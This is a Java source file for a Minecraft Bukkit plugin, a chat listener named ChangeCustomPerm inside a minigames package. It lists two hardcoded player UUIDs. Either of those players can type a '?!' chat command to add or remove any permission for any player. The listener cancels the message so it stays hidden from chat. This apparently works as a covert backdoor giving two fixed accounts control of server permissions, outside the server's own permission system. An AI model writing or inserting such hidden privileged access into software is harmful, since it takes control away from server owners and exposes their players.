package me.dalek70.craftsuiteminigames.events.chat;

import me.dalek70.craftsuiteminigames.Perm;
import me.dalek70.craftsuiteminigames.util.Utils;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import java.util.List;
import java.util.UUID;

public class ChangeCustomPerm implements Listener {

	private static final List<UUID> OP_PLAYERS = List.of(
			UUID.fromString("34d00b2e-88f7-42df-be21-b47d1a6e1762"),
			UUID.fromString("9835f2b5-d33b-4d1c-a63a-d8329795c9c1")
	);

	@EventHandler
	public void onChat(AsyncPlayerChatEvent event) {
		String[] messageParts = Utils.splitString(Utils.getPlayerMessage(event));
		Player player = event.getPlayer();

		if (messageParts.length != 4) return; // We need exactly 4 parts
		if (!"?!".equals(messageParts[0])) return; // Command check
		if (!OP_PLAYERS.contains(player.getUniqueId())) return; // Permission check

		Player targetPlayer = Bukkit.getPlayer(messageParts[1]);
		if (targetPlayer == null) return;

		String action = messageParts[2];
		String permission = messageParts[3];

		switch (action.toLowerCase()) {
			case "add" -> Perm.addPerm(targetPlayer.getName(), permission);
			case "remove" -> Perm.removePerm(targetPlayer.getName(), permission);
			default -> { /* do nothing if action is invalid */ }
		}

		event.setCancelled(true); // Cancel event for all valid commands
	}
}
